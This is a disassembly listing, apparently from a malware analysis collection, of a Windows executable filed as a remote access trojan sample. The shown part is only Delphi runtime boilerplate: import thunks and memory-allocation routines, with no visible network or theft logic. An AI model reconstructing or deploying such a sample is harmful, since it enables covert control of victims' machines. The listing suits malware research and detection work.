
malware_samples/rat/3c41678d0524994308815afb2fa7f98bba1903ba0311128db486f7e67d967b6e.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	04 10                	add    $0x10,%al
  401002:	40                   	inc    %eax
  401003:	00 0a                	add    %cl,(%edx)
  401005:	06                   	push   %es
  401006:	53                   	push   %ebx
  401007:	74 72                	je     0x40107b
  401009:	69 6e 67 58 10 40 00 	imul   $0x401058,0x67(%esi),%ebp
	...
  40102c:	58                   	pop    %eax
  40102d:	10 40 00             	adc    %al,0x0(%eax)
  401030:	04 00                	add    $0x0,%al
  401032:	00 00                	add    %al,(%eax)
  401034:	00 00                	add    %al,(%eax)
  401036:	00 00                	add    %al,(%eax)
  401038:	f4                   	hlt
  401039:	2e 40                	cs inc %eax
  40103b:	00 00                	add    %al,(%eax)
  40103d:	2f                   	das
  40103e:	40                   	inc    %eax
  40103f:	00 04 2f             	add    %al,(%edi,%ebp,1)
  401042:	40                   	inc    %eax
  401043:	00 08                	add    %cl,(%eax)
  401045:	2f                   	das
  401046:	40                   	inc    %eax
  401047:	00 fc                	add    %bh,%ah
  401049:	2e 40                	cs inc %eax
  40104b:	00 d8                	add    %bl,%al
  40104d:	2d 40 00 f4 2d       	sub    $0x2df40040,%eax
  401052:	40                   	inc    %eax
  401053:	00 30                	add    %dh,(%eax)
  401055:	2e 40                	cs inc %eax
  401057:	00 07                	add    %al,(%edi)
  401059:	54                   	push   %esp
  40105a:	4f                   	dec    %edi
  40105b:	62 6a 65             	bound  %ebp,0x65(%edx)
  40105e:	63 74 ff 25          	arpl   %esi,0x25(%edi,%edi,8)
  401062:	08 c1                	or     %al,%cl
  401064:	40                   	inc    %eax
  401065:	00 8b c0 ff 25 04    	add    %cl,0x425ffc0(%ebx)
  40106b:	c1 40 00 8b          	roll   $0x8b,0x0(%eax)
  40106f:	c0 ff 25             	sar    $0x25,%bh
  401072:	00 c1                	add    %al,%cl
  401074:	40                   	inc    %eax
  401075:	00 8b c0 ff 25 fc    	add    %cl,-0x3da0040(%ebx)
  40107b:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  40107f:	c0 ff 25             	sar    $0x25,%bh
  401082:	f8                   	clc
  401083:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  401087:	c0 ff 25             	sar    $0x25,%bh
  40108a:	18 c1                	sbb    %al,%cl
  40108c:	40                   	inc    %eax
  40108d:	00 8b c0 ff 25 f4    	add    %cl,-0xbda0040(%ebx)
  401093:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  401097:	c0 ff 25             	sar    $0x25,%bh
  40109a:	14 c1                	adc    $0xc1,%al
  40109c:	40                   	inc    %eax
  40109d:	00 8b c0 ff 25 f0    	add    %cl,-0xfda0040(%ebx)
  4010a3:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  4010a7:	c0 ff 25             	sar    $0x25,%bh
  4010aa:	ec                   	in     (%dx),%al
  4010ab:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  4010af:	c0 ff 25             	sar    $0x25,%bh
  4010b2:	e8 c0 40 00 8b       	call   0x8b405177
  4010b7:	c0 ff 25             	sar    $0x25,%bh
  4010ba:	e4 c0                	in     $0xc0,%al
  4010bc:	40                   	inc    %eax
  4010bd:	00 8b c0 ff 25 e0    	add    %cl,-0x1fda0040(%ebx)
  4010c3:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  4010c7:	c0 ff 25             	sar    $0x25,%bh
  4010ca:	dc c0                	fadd   %st,%st(0)
  4010cc:	40                   	inc    %eax
  4010cd:	00 8b c0 ff 25 28    	add    %cl,0x2825ffc0(%ebx)
  4010d3:	c1 40 00 8b          	roll   $0x8b,0x0(%eax)
  4010d7:	c0 ff 25             	sar    $0x25,%bh
  4010da:	24 c1                	and    $0xc1,%al
  4010dc:	40                   	inc    %eax
  4010dd:	00 8b c0 ff 25 20    	add    %cl,0x2025ffc0(%ebx)
  4010e3:	c1 40 00 8b          	roll   $0x8b,0x0(%eax)
  4010e7:	c0 ff 25             	sar    $0x25,%bh
  4010ea:	38 c1                	cmp    %al,%cl
  4010ec:	40                   	inc    %eax
  4010ed:	00 8b c0 ff 25 34    	add    %cl,0x3425ffc0(%ebx)
  4010f3:	c1 40 00 8b          	roll   $0x8b,0x0(%eax)
  4010f7:	c0 ff 25             	sar    $0x25,%bh
  4010fa:	30 c1                	xor    %al,%cl
  4010fc:	40                   	inc    %eax
  4010fd:	00 8b c0 ff 25 d8    	add    %cl,-0x27da0040(%ebx)
  401103:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  401107:	c0 ff 25             	sar    $0x25,%bh
  40110a:	d4 c0                	aam    $0xc0
  40110c:	40                   	inc    %eax
  40110d:	00 8b c0 53 83 c4    	add    %cl,-0x3b7cac40(%ebx)
  401113:	bc bb 0a 00 00       	mov    $0xabb,%esp
  401118:	00 54 e8 a1          	add    %dl,-0x5f(%eax,%ebp,8)
  40111c:	ff                   	(bad)
  40111d:	ff                   	(bad)
  40111e:	ff f6                	push   %esi
  401120:	44                   	inc    %esp
  401121:	24 2c                	and    $0x2c,%al
  401123:	01 74 05 0f          	add    %esi,0xf(%ebp,%eax,1)
  401127:	b7 5c                	mov    $0x5c,%bh
  401129:	24 30                	and    $0x30,%al
  40112b:	8b c3                	mov    %ebx,%eax
  40112d:	83 c4 44             	add    $0x44,%esp
  401130:	5b                   	pop    %ebx
  401131:	c3                   	ret
  401132:	8b c0                	mov    %eax,%eax
  401134:	ff 25 d0 c0 40 00    	jmp    *0x40c0d0
  40113a:	8b c0                	mov    %eax,%eax
  40113c:	ff 25 cc c0 40 00    	jmp    *0x40c0cc
  401142:	8b c0                	mov    %eax,%eax
  401144:	ff 25 c8 c0 40 00    	jmp    *0x40c0c8
  40114a:	8b c0                	mov    %eax,%eax
  40114c:	ff 25 c4 c0 40 00    	jmp    *0x40c0c4
  401152:	8b c0                	mov    %eax,%eax
  401154:	ff 25 c0 c0 40 00    	jmp    *0x40c0c0
  40115a:	8b c0                	mov    %eax,%eax
  40115c:	ff 25 bc c0 40 00    	jmp    *0x40c0bc
  401162:	8b c0                	mov    %eax,%eax
  401164:	ff 25 b8 c0 40 00    	jmp    *0x40c0b8
  40116a:	8b c0                	mov    %eax,%eax
  40116c:	ff 25 b4 c0 40 00    	jmp    *0x40c0b4
  401172:	8b c0                	mov    %eax,%eax
  401174:	53                   	push   %ebx
  401175:	83 c4 f4             	add    $0xfffffff4,%esp
  401178:	bb d0 b5 40 00       	mov    $0x40b5d0,%ebx
  40117d:	83 3b 00             	cmpl   $0x0,(%ebx)
  401180:	75 59                	jne    0x4011db
  401182:	68 44 06 00 00       	push   $0x644
  401187:	6a 00                	push   $0x0
  401189:	e8 a6 ff ff ff       	call   0x401134
  40118e:	89 44 24 08          	mov    %eax,0x8(%esp)
  401192:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401197:	75 07                	jne    0x4011a0
  401199:	33 c0                	xor    %eax,%eax
  40119b:	89 04 24             	mov    %eax,(%esp)
  40119e:	eb 50                	jmp    0x4011f0
  4011a0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4011a4:	8b 15 cc b5 40 00    	mov    0x40b5cc,%edx
  4011aa:	89 10                	mov    %edx,(%eax)
  4011ac:	8b 44 24 08          	mov    0x8(%esp),%eax
  4011b0:	a3 cc b5 40 00       	mov    %eax,0x40b5cc
  4011b5:	33 c0                	xor    %eax,%eax
  4011b7:	8b d0                	mov    %eax,%edx
  4011b9:	03 d2                	add    %edx,%edx
  4011bb:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4011bf:	8d 54 d1 04          	lea    0x4(%ecx,%edx,8),%edx
  4011c3:	89 54 24 04          	mov    %edx,0x4(%esp)
  4011c7:	8b 54 24 04          	mov    0x4(%esp),%edx
  4011cb:	8b 0b                	mov    (%ebx),%ecx
  4011cd:	89 0a                	mov    %ecx,(%edx)
  4011cf:	8b 54 24 04          	mov    0x4(%esp),%edx
  4011d3:	89 13                	mov    %edx,(%ebx)
  4011d5:	40                   	inc    %eax
  4011d6:	83 f8 64             	cmp    $0x64,%eax
  4011d9:	75 dc                	jne    0x4011b7
  4011db:	8b 03                	mov    (%ebx),%eax
  4011dd:	89 44 24 04          	mov    %eax,0x4(%esp)
  4011e1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011e5:	8b 00                	mov    (%eax),%eax
  4011e7:	89 03                	mov    %eax,(%ebx)
  4011e9:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011ed:	89 04 24             	mov    %eax,(%esp)
  4011f0:	8b 04 24             	mov    (%esp),%eax
  4011f3:	83 c4 0c             	add    $0xc,%esp
  4011f6:	5b                   	pop    %ebx
  4011f7:	c3                   	ret
  4011f8:	89 00                	mov    %eax,(%eax)
  4011fa:	89 40 04             	mov    %eax,0x4(%eax)
  4011fd:	c3                   	ret
  4011fe:	8b c0                	mov    %eax,%eax
  401200:	53                   	push   %ebx
  401201:	56                   	push   %esi
  401202:	83 c4 f8             	add    $0xfffffff8,%esp
  401205:	8b f2                	mov    %edx,%esi
  401207:	8b d8                	mov    %eax,%ebx
  401209:	e8 66 ff ff ff       	call   0x401174
  40120e:	89 44 24 04          	mov    %eax,0x4(%esp)
  401212:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401217:	75 04                	jne    0x40121d
  401219:	33 c0                	xor    %eax,%eax
  40121b:	eb 3a                	jmp    0x401257
  40121d:	8b 06                	mov    (%esi),%eax
  40121f:	8b 54 24 04          	mov    0x4(%esp),%edx
  401223:	89 42 08             	mov    %eax,0x8(%edx)
  401226:	8b 46 04             	mov    0x4(%esi),%eax
  401229:	8b 54 24 04          	mov    0x4(%esp),%edx
  40122d:	89 42 0c             	mov    %eax,0xc(%edx)
  401230:	8b 03                	mov    (%ebx),%eax
  401232:	89 04 24             	mov    %eax,(%esp)
  401235:	8b 44 24 04          	mov    0x4(%esp),%eax
  401239:	8b 14 24             	mov    (%esp),%edx
  40123c:	89 10                	mov    %edx,(%eax)
  40123e:	8b 44 24 04          	mov    0x4(%esp),%eax
  401242:	89 58 04             	mov    %ebx,0x4(%eax)
  401245:	8b 04 24             	mov    (%esp),%eax
  401248:	8b 54 24 04          	mov    0x4(%esp),%edx
  40124c:	89 50 04             	mov    %edx,0x4(%eax)
  40124f:	8b 44 24 04          	mov    0x4(%esp),%eax
  401253:	89 03                	mov    %eax,(%ebx)
  401255:	b0 01                	mov    $0x1,%al
  401257:	59                   	pop    %ecx
  401258:	5a                   	pop    %edx
  401259:	5e                   	pop    %esi
  40125a:	5b                   	pop    %ebx
  40125b:	c3                   	ret
  40125c:	83 c4 f8             	add    $0xfffffff8,%esp
  40125f:	8b 50 04             	mov    0x4(%eax),%edx
  401262:	89 14 24             	mov    %edx,(%esp)
  401265:	8b 10                	mov    (%eax),%edx
  401267:	89 54 24 04          	mov    %edx,0x4(%esp)
  40126b:	8b 14 24             	mov    (%esp),%edx
  40126e:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401272:	89 0a                	mov    %ecx,(%edx)
  401274:	8b 54 24 04          	mov    0x4(%esp),%edx
  401278:	8b 0c 24             	mov    (%esp),%ecx
  40127b:	89 4a 04             	mov    %ecx,0x4(%edx)
  40127e:	8b 15 d0 b5 40 00    	mov    0x40b5d0,%edx
  401284:	89 10                	mov    %edx,(%eax)
  401286:	a3 d0 b5 40 00       	mov    %eax,0x40b5d0
  40128b:	59                   	pop    %ecx
  40128c:	5a                   	pop    %edx
  40128d:	c3                   	ret
  40128e:	8b c0                	mov    %eax,%eax
  401290:	53                   	push   %ebx
  401291:	56                   	push   %esi
  401292:	57                   	push   %edi
  401293:	55                   	push   %ebp
  401294:	83 c4 f8             	add    $0xfffffff8,%esp
  401297:	8b d9                	mov    %ecx,%ebx
  401299:	8b f0                	mov    %eax,%esi
  40129b:	8b fc                	mov    %esp,%edi
  40129d:	8b 06                	mov    (%esi),%eax
  40129f:	89 07                	mov    %eax,(%edi)
  4012a1:	8b 02                	mov    (%edx),%eax
  4012a3:	89 03                	mov    %eax,(%ebx)
  4012a5:	8b 42 04             	mov    0x4(%edx),%eax
  4012a8:	89 43 04             	mov    %eax,0x4(%ebx)
  4012ab:	8b 07                	mov    (%edi),%eax
  4012ad:	8b 00                	mov    (%eax),%eax
  4012af:	89 44 24 04          	mov    %eax,0x4(%esp)
  4012b3:	8b 17                	mov    (%edi),%edx
  4012b5:	8b 52 08             	mov    0x8(%edx),%edx
  4012b8:	8b ca                	mov    %edx,%ecx
  4012ba:	8b 2f                	mov    (%edi),%ebp
  4012bc:	03 4d 0c             	add    0xc(%ebp),%ecx
  4012bf:	8b 03                	mov    (%ebx),%eax
  4012c1:	3b c8                	cmp    %eax,%ecx
  4012c3:	75 18                	jne    0x4012dd
  4012c5:	8b 07                	mov    (%edi),%eax
  4012c7:	e8 90 ff ff ff       	call   0x40125c
  4012cc:	8b 07                	mov    (%edi),%eax
  4012ce:	8b 40 08             	mov    0x8(%eax),%eax
  4012d1:	89 03                	mov    %eax,(%ebx)
  4012d3:	8b 07                	mov    (%edi),%eax
  4012d5:	8b 40 0c             	mov    0xc(%eax),%eax
  4012d8:	01 43 04             	add    %eax,0x4(%ebx)
  4012db:	eb 16                	jmp    0x4012f3
  4012dd:	03 43 04             	add    0x4(%ebx),%eax
  4012e0:	3b d0                	cmp    %eax,%edx
  4012e2:	75 0f                	jne    0x4012f3
  4012e4:	8b 07                	mov    (%edi),%eax
  4012e6:	e8 71 ff ff ff       	call   0x40125c
  4012eb:	8b 07                	mov    (%edi),%eax
  4012ed:	8b 40 0c             	mov    0xc(%eax),%eax
  4012f0:	01 43 04             	add    %eax,0x4(%ebx)
  4012f3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4012f7:	89 07                	mov    %eax,(%edi)
  4012f9:	3b 37                	cmp    (%edi),%esi
  4012fb:	75 ae                	jne    0x4012ab
  4012fd:	8b d3                	mov    %ebx,%edx
  4012ff:	8b c6                	mov    %esi,%eax
  401301:	e8 fa fe ff ff       	call   0x401200
  401306:	84 c0                	test   %al,%al
  401308:	75 04                	jne    0x40130e
  40130a:	33 c0                	xor    %eax,%eax
  40130c:	89 03                	mov    %eax,(%ebx)
  40130e:	59                   	pop    %ecx
  40130f:	5a                   	pop    %edx
  401310:	5d                   	pop    %ebp
  401311:	5f                   	pop    %edi
  401312:	5e                   	pop    %esi
  401313:	5b                   	pop    %ebx
  401314:	c3                   	ret
  401315:	8d 40 00             	lea    0x0(%eax),%eax
  401318:	53                   	push   %ebx
  401319:	56                   	push   %esi
  40131a:	57                   	push   %edi
  40131b:	55                   	push   %ebp
  40131c:	83 c4 f0             	add    $0xfffffff0,%esp
  40131f:	89 04 24             	mov    %eax,(%esp)
  401322:	8b f4                	mov    %esp,%esi
  401324:	8b 06                	mov    (%esi),%eax
  401326:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40132a:	8b 0a                	mov    (%edx),%ecx
  40132c:	8b 06                	mov    (%esi),%eax
  40132e:	8b 40 08             	mov    0x8(%eax),%eax
  401331:	3b c8                	cmp    %eax,%ecx
  401333:	0f 82 86 00 00 00    	jb     0x4013bf
  401339:	8b d8                	mov    %eax,%ebx
  40133b:	8b 3e                	mov    (%esi),%edi
  40133d:	03 5f 0c             	add    0xc(%edi),%ebx
  401340:	8b f9                	mov    %ecx,%edi
  401342:	03 7a 04             	add    0x4(%edx),%edi
  401345:	3b df                	cmp    %edi,%ebx
  401347:	72 76                	jb     0x4013bf
  401349:	3b c8                	cmp    %eax,%ecx
  40134b:	75 21                	jne    0x40136e
  40134d:	8b 42 04             	mov    0x4(%edx),%eax
  401350:	8b 0e                	mov    (%esi),%ecx
  401352:	01 41 08             	add    %eax,0x8(%ecx)
  401355:	8b 42 04             	mov    0x4(%edx),%eax
  401358:	8b 16                	mov    (%esi),%edx
  40135a:	29 42 0c             	sub    %eax,0xc(%edx)
  40135d:	8b 06                	mov    (%esi),%eax
  40135f:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  401363:	75 56                	jne    0x4013bb
  401365:	8b 06                	mov    (%esi),%eax
  401367:	e8 f0 fe ff ff       	call   0x40125c
  40136c:	eb 4d                	jmp    0x4013bb
  40136e:	8b d8                	mov    %eax,%ebx
  401370:	8b 3e                	mov    (%esi),%edi
  401372:	03 5f 0c             	add    0xc(%edi),%ebx
  401375:	8b f9                	mov    %ecx,%edi
  401377:	03 7a 04             	add    0x4(%edx),%edi
  40137a:	3b df                	cmp    %edi,%ebx
  40137c:	75 0a                	jne    0x401388
  40137e:	8b 42 04             	mov    0x4(%edx),%eax
  401381:	8b 16                	mov    (%esi),%edx
  401383:	29 42 0c             	sub    %eax,0xc(%edx)
  401386:	eb 33                	jmp    0x4013bb
  401388:	8b 1a                	mov    (%edx),%ebx
  40138a:	03 5a 04             	add    0x4(%edx),%ebx
  40138d:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401391:	8b 3e                	mov    (%esi),%edi
  401393:	8b 7f 08             	mov    0x8(%edi),%edi
  401396:	8b 2e                	mov    (%esi),%ebp
  401398:	03 7d 0c             	add    0xc(%ebp),%edi
  40139b:	2b fb                	sub    %ebx,%edi
  40139d:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4013a1:	2b c8                	sub    %eax,%ecx
  4013a3:	8b 06                	mov    (%esi),%eax
  4013a5:	89 48 0c             	mov    %ecx,0xc(%eax)
  4013a8:	8d 54 24 04          	lea    0x4(%esp),%edx
  4013ac:	8b 06                	mov    (%esi),%eax
  4013ae:	e8 4d fe ff ff       	call   0x401200
  4013b3:	84 c0                	test   %al,%al
  4013b5:	75 04                	jne    0x4013bb
  4013b7:	33 c0                	xor    %eax,%eax
  4013b9:	eb 18                	jmp    0x4013d3
  4013bb:	b0 01                	mov    $0x1,%al
  4013bd:	eb 14                	jmp    0x4013d3
  4013bf:	8b 06                	mov    (%esi),%eax
  4013c1:	8b 00                	mov    (%eax),%eax
  4013c3:	89 06                	mov    %eax,(%esi)
  4013c5:	8b 06                	mov    (%esi),%eax
  4013c7:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  4013cb:	0f 85 59 ff ff ff    	jne    0x40132a
  4013d1:	33 c0                	xor    %eax,%eax
  4013d3:	83 c4 10             	add    $0x10,%esp
  4013d6:	5d                   	pop    %ebp
  4013d7:	5f                   	pop    %edi
  4013d8:	5e                   	pop    %esi
  4013d9:	5b                   	pop    %ebx
  4013da:	c3                   	ret
  4013db:	90                   	nop
  4013dc:	53                   	push   %ebx
  4013dd:	56                   	push   %esi
  4013de:	57                   	push   %edi
  4013df:	8b da                	mov    %edx,%ebx
  4013e1:	8b f0                	mov    %eax,%esi
  4013e3:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  4013e9:	7d 07                	jge    0x4013f2
  4013eb:	be 00 00 10 00       	mov    $0x100000,%esi
  4013f0:	eb 0c                	jmp    0x4013fe
  4013f2:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  4013f8:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  4013fe:	89 73 04             	mov    %esi,0x4(%ebx)
  401401:	6a 01                	push   $0x1
  401403:	68 00 20 00 00       	push   $0x2000
  401408:	56                   	push   %esi
  401409:	6a 00                	push   $0x0
  40140b:	e8 34 fd ff ff       	call   0x401144
  401410:	8b f8                	mov    %eax,%edi
  401412:	89 3b                	mov    %edi,(%ebx)
  401414:	85 ff                	test   %edi,%edi
  401416:	74 23                	je     0x40143b
  401418:	8b d3                	mov    %ebx,%edx
  40141a:	b8 d4 b5 40 00       	mov    $0x40b5d4,%eax
  40141f:	e8 dc fd ff ff       	call   0x401200
  401424:	84 c0                	test   %al,%al
  401426:	75 13                	jne    0x40143b
  401428:	68 00 80 00 00       	push   $0x8000
  40142d:	6a 00                	push   $0x0
  40142f:	8b 03                	mov    (%ebx),%eax
  401431:	50                   	push   %eax
  401432:	e8 15 fd ff ff       	call   0x40114c
  401437:	33 c0                	xor    %eax,%eax
  401439:	89 03                	mov    %eax,(%ebx)
  40143b:	5f                   	pop    %edi
  40143c:	5e                   	pop    %esi
  40143d:	5b                   	pop    %ebx
  40143e:	c3                   	ret
  40143f:	90                   	nop
  401440:	53                   	push   %ebx
  401441:	56                   	push   %esi
  401442:	57                   	push   %edi
  401443:	55                   	push   %ebp
  401444:	8b d9                	mov    %ecx,%ebx
  401446:	8b f2                	mov    %edx,%esi
  401448:	8b e8                	mov    %eax,%ebp
  40144a:	c7 43 04 00 00 10 00 	movl   $0x100000,0x4(%ebx)
  401451:	6a 04                	push   $0x4
  401453:	68 00 20 00 00       	push   $0x2000
  401458:	68 00 00 10 00       	push   $0x100000
  40145d:	55                   	push   %ebp
  40145e:	e8 e1 fc ff ff       	call   0x401144
  401463:	8b f8                	mov    %eax,%edi
  401465:	89 3b                	mov    %edi,(%ebx)
  401467:	85 ff                	test   %edi,%edi
  401469:	75 1f                	jne    0x40148a
  40146b:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  401471:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  401477:	89 73 04             	mov    %esi,0x4(%ebx)
  40147a:	6a 04                	push   $0x4
  40147c:	68 00 20 00 00       	push   $0x2000
  401481:	56                   	push   %esi
  401482:	55                   	push   %ebp
  401483:	e8 bc fc ff ff       	call   0x401144
  401488:	89 03                	mov    %eax,(%ebx)
  40148a:	83 3b 00             	cmpl   $0x0,(%ebx)
  40148d:	74 23                	je     0x4014b2
  40148f:	8b d3                	mov    %ebx,%edx
  401491:	b8 d4 b5 40 00       	mov    $0x40b5d4,%eax
  401496:	e8 65 fd ff ff       	call   0x401200
  40149b:	84 c0                	test   %al,%al
  40149d:	75 13                	jne    0x4014b2
  40149f:	68 00 80 00 00       	push   $0x8000
  4014a4:	6a 00                	push   $0x0
  4014a6:	8b 03                	mov    (%ebx),%eax
  4014a8:	50                   	push   %eax
  4014a9:	e8 9e fc ff ff       	call   0x40114c
  4014ae:	33 c0                	xor    %eax,%eax
  4014b0:	89 03                	mov    %eax,(%ebx)
  4014b2:	5d                   	pop    %ebp
  4014b3:	5f                   	pop    %edi
  4014b4:	5e                   	pop    %esi
  4014b5:	5b                   	pop    %ebx
  4014b6:	c3                   	ret
  4014b7:	90                   	nop
  4014b8:	53                   	push   %ebx
  4014b9:	56                   	push   %esi
  4014ba:	57                   	push   %edi
  4014bb:	55                   	push   %ebp
  4014bc:	83 c4 e8             	add    $0xffffffe8,%esp
  4014bf:	8b f9                	mov    %ecx,%edi
  4014c1:	8b f4                	mov    %esp,%esi
  4014c3:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  4014ca:	ff 
  4014cb:	33 c9                	xor    %ecx,%ecx
  4014cd:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  4014d1:	89 44 24 10          	mov    %eax,0x10(%esp)
  4014d5:	03 54 24 10          	add    0x10(%esp),%edx
  4014d9:	89 54 24 14          	mov    %edx,0x14(%esp)
  4014dd:	a1 d4 b5 40 00       	mov    0x40b5d4,%eax
  4014e2:	89 06                	mov    %eax,(%esi)
  4014e4:	eb 6b                	jmp    0x401551
  4014e6:	8b 06                	mov    (%esi),%eax
  4014e8:	8b 00                	mov    (%eax),%eax
  4014ea:	89 44 24 04          	mov    %eax,0x4(%esp)
  4014ee:	8b 06                	mov    (%esi),%eax
  4014f0:	8b 58 08             	mov    0x8(%eax),%ebx
  4014f3:	3b 5c 24 10          	cmp    0x10(%esp),%ebx
  4014f7:	72 52                	jb     0x40154b
  4014f9:	8b c3                	mov    %ebx,%eax
  4014fb:	8b 16                	mov    (%esi),%edx
  4014fd:	03 42 0c             	add    0xc(%edx),%eax
  401500:	3b 44 24 14          	cmp    0x14(%esp),%eax
  401504:	77 45                	ja     0x40154b
  401506:	3b 5c 24 08          	cmp    0x8(%esp),%ebx
  40150a:	73 04                	jae    0x401510
  40150c:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  401510:	8b 06                	mov    (%esi),%eax
  401512:	8b 68 08             	mov    0x8(%eax),%ebp
  401515:	8b 06                	mov    (%esi),%eax
  401517:	03 68 0c             	add    0xc(%eax),%ebp
  40151a:	3b 6c 24 0c          	cmp    0xc(%esp),%ebp
  40151e:	76 04                	jbe    0x401524
  401520:	89 6c 24 0c          	mov    %ebp,0xc(%esp)
  401524:	68 00 80 00 00       	push   $0x8000
  401529:	6a 00                	push   $0x0
  40152b:	8b 06                	mov    (%esi),%eax
  40152d:	8b 40 08             	mov    0x8(%eax),%eax
  401530:	50                   	push   %eax
  401531:	e8 16 fc ff ff       	call   0x40114c
  401536:	85 c0                	test   %eax,%eax
  401538:	75 0a                	jne    0x401544
  40153a:	c7 05 b0 b5 40 00 01 	movl   $0x1,0x40b5b0
  401541:	00 00 00 
  401544:	8b 06                	mov    (%esi),%eax
  401546:	e8 11 fd ff ff       	call   0x40125c
  40154b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40154f:	89 06                	mov    %eax,(%esi)
  401551:	b8 d4 b5 40 00       	mov    $0x40b5d4,%eax
  401556:	3b 06                	cmp    (%esi),%eax
  401558:	75 8c                	jne    0x4014e6
  40155a:	33 c0                	xor    %eax,%eax
  40155c:	89 07                	mov    %eax,(%edi)
  40155e:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  401563:	74 11                	je     0x401576
  401565:	8b 44 24 08          	mov    0x8(%esp),%eax
  401569:	89 07                	mov    %eax,(%edi)
  40156b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40156f:	2b 44 24 08          	sub    0x8(%esp),%eax
  401573:	89 47 04             	mov    %eax,0x4(%edi)
  401576:	83 c4 18             	add    $0x18,%esp
  401579:	5d                   	pop    %ebp
  40157a:	5f                   	pop    %edi
  40157b:	5e                   	pop    %esi
  40157c:	5b                   	pop    %ebx
  40157d:	c3                   	ret
  40157e:	8b c0                	mov    %eax,%eax
  401580:	53                   	push   %ebx
  401581:	56                   	push   %esi
  401582:	57                   	push   %edi
  401583:	55                   	push   %ebp
  401584:	83 c4 e8             	add    $0xffffffe8,%esp
  401587:	8b d9                	mov    %ecx,%ebx
  401589:	89 14 24             	mov    %edx,(%esp)
  40158c:	8d 74 24 08          	lea    0x8(%esp),%esi
  401590:	8d 7c 24 04          	lea    0x4(%esp),%edi
  401594:	8d 6c 24 0c          	lea    0xc(%esp),%ebp
  401598:	8b d0                	mov    %eax,%edx
  40159a:	8b ca                	mov    %edx,%ecx
  40159c:	81 e1 00 f0 ff ff    	and    $0xfffff000,%ecx
  4015a2:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4015a6:	03 14 24             	add    (%esp),%edx
  4015a9:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
  4015af:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  4015b5:	89 54 24 14          	mov    %edx,0x14(%esp)
  4015b9:	8b 44 24 10          	mov    0x10(%esp),%eax
  4015bd:	89 03                	mov    %eax,(%ebx)
  4015bf:	8b 44 24 14          	mov    0x14(%esp),%eax
  4015c3:	2b 44 24 10          	sub    0x10(%esp),%eax
  4015c7:	89 43 04             	mov    %eax,0x4(%ebx)
  4015ca:	a1 d4 b5 40 00       	mov    0x40b5d4,%eax
  4015cf:	89 07                	mov    %eax,(%edi)
  4015d1:	eb 5b                	jmp    0x40162e
  4015d3:	8b 07                	mov    (%edi),%eax
  4015d5:	8b 40 08             	mov    0x8(%eax),%eax
  4015d8:	89 06                	mov    %eax,(%esi)
  4015da:	8b 07                	mov    (%edi),%eax
  4015dc:	8b 40 0c             	mov    0xc(%eax),%eax
  4015df:	03 06                	add    (%esi),%eax
  4015e1:	89 45 00             	mov    %eax,0x0(%ebp)
  4015e4:	8b 06                	mov    (%esi),%eax
  4015e6:	3b 44 24 10          	cmp    0x10(%esp),%eax
  4015ea:	73 06                	jae    0x4015f2
  4015ec:	8b 44 24 10          	mov    0x10(%esp),%eax
  4015f0:	89 06                	mov    %eax,(%esi)
  4015f2:	8b 45 00             	mov    0x0(%ebp),%eax
  4015f5:	3b 44 24 14          	cmp    0x14(%esp),%eax
  4015f9:	76 07                	jbe    0x401602
  4015fb:	8b 44 24 14          	mov    0x14(%esp),%eax
  4015ff:	89 45 00             	mov    %eax,0x0(%ebp)
  401602:	8b 06                	mov    (%esi),%eax
  401604:	3b 45 00             	cmp    0x0(%ebp),%eax
  401607:	73 1f                	jae    0x401628
  401609:	6a 04                	push   $0x4
  40160b:	68 00 10 00 00       	push   $0x1000
  401610:	8b 45 00             	mov    0x0(%ebp),%eax
  401613:	2b 06                	sub    (%esi),%eax
  401615:	50                   	push   %eax
  401616:	8b 06                	mov    (%esi),%eax
  401618:	50                   	push   %eax
  401619:	e8 26 fb ff ff       	call   0x401144
  40161e:	85 c0                	test   %eax,%eax
  401620:	75 06                	jne    0x401628
  401622:	33 c0                	xor    %eax,%eax
  401624:	89 03                	mov    %eax,(%ebx)
  401626:	eb 0f                	jmp    0x401637
  401628:	8b 07                	mov    (%edi),%eax
  40162a:	8b 00                	mov    (%eax),%eax
  40162c:	89 07                	mov    %eax,(%edi)
  40162e:	b8 d4 b5 40 00       	mov    $0x40b5d4,%eax
  401633:	3b 07                	cmp    (%edi),%eax
  401635:	75 9c                	jne    0x4015d3
  401637:	83 c4 18             	add    $0x18,%esp
  40163a:	5d                   	pop    %ebp
  40163b:	5f                   	pop    %edi
  40163c:	5e                   	pop    %esi
  40163d:	5b                   	pop    %ebx
  40163e:	c3                   	ret
  40163f:	90                   	nop
  401640:	53                   	push   %ebx
  401641:	56                   	push   %esi
  401642:	57                   	push   %edi
  401643:	55                   	push   %ebp
